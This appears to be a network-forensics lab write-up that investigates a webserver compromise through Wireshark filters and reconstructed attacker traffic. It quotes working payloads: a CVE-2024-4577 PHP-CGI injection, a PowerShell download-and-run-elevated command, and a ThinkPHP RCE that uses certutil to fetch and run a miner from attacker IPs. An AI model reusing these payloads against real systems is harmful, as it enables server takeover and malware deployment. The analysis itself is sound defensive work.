# Case 06 – Webserver Compromise Investigation

## Overview
This case analyzes a public-facing webserver compromise involving remote code execution, privilege escalation, malware deployment, and outbound exploitation traffic targeting vulnerable PHP frameworks.

---

## 📌 Question 1  
**Which vulnerability was exploited to gain initial access to the public webserver?**

I determined that the IP `36.96.48.3` contacted many IPs, so I filtered:

```
ip.addr == 36.96.48.3 && http.request.method == "POST"
```

I found this suspicious script:

```
POST /index.php?%ADd+allow_url_include=1+-d+auto_prepend_file=php://input
<?php system('curl http://1.80.23.4:8000/'); ?>
```

This structure matches the PHP-CGI argument injection exploit.  
Based on server response headers (`Apache/2.4.58 (Win64), PHP/8.1.25`), the vulnerability aligns with:

**CVE-2024-4577 – PHP Argument Injection RCE**

 
<img width="1330" height="982" alt="image" src="https://github.com/user-attachments/assets/4fd12b21-9cb3-4772-891f-ea8772c6d480" />

---

## 📌 Question 2  
**What is the Unicode code point used in the exploit?**

In the payload:

```
/index.php?%ADd+allow_url_include=1+-d+auto_prepend_file=php://input
```

The suspicious byte is:

- `%AD`  
- Hex: `0xAD`  
- Unicode: **U+00AD (Soft Hyphen)**

Used to smuggle “`-d`” after decoding.

---

## 📌 Question 3  
**What is the exact model of the CPU identified by the attacker’s script?**

Filtered:

```
ip.src == 36.96.48.3 && http
```

Then followed the HTTP stream from the attacker-controlled address `1.80.23.4`.

<img width="2730" height="1276" alt="image" src="https://github.com/user-attachments/assets/463de4a2-e667-4955-b1e8-6b8c737ec0e2" />

---

## 📌 Question 4  
**What command was used to start the downloaded file with elevated permissions?**

From the attacker’s POST request:

```
<?php system('powershell -ExecutionPolicy Bypass -Command "& {
    Invoke-WebRequest -Uri http://1.80.23.4:8000/2.txt -OutFile C:\Windows\Temp\2.exe;
    Start-Process C:\Windows\Temp\2.exe -Verb RunAs
}"'); ?>
```

Used **Start-Process … -Verb RunAs** to force elevation.

<img width="2580" height="1370" alt="image" src="https://github.com/user-attachments/assets/0f5e94e0-327e-4a6c-b554-3f9b4b70c9bb" />

---

## 📌 Question 5  
**What vulnerable PHP framework was targeted by outbound attacks?**

From compromised host outbound payload:

```
GET /index.php?s=index/\think\Container/invokeFunction&function=call_user_func_array&vars[]=system&vars[1][]=cmd.exe /c certutil -urlcache -split -f http://36.96.48.3:19490/spread.txt C:\ProgramData\spread.exe && C:\ProgramData\spread.exe
```

This targets:

**ThinkPHP Framework RCE**

---

## 📌 Question 7  
**Where was the malware stored after download?**

From certutil command:

```
C:\ProgramData\spread.exe
```

Stored in:

**C:\ProgramData\spread.exe**

---

## 📌 Question 9  
**What mining software and version was deployed?**

I exported all objects to the `artifacts/` directory and grepped for known mining binaries:

```
BlackSquidMining / SpreadMiner
```

This is a modified fork of XMRig:

**XMRig 5.5.0**

<img width="2786" height="1418" alt="image" src="https://github.com/user-attachments/assets/5da3ba99-43ea-4a9c-b149-7fb4762d7c7e" />

---

## Folder Structure for This Case

```
Investigation-06-Webserver-Compromise/
│
├── README.md
├── screenshots/
│   ├── 01.png
│   ├── 02.png
│   ├── 03.png
│   └── 04.png
│
├── artifacts/
│   └── extracted-files-here
│
└── queries/
    └── filters-and-cli-commands.txt
```

---

## End of Case04
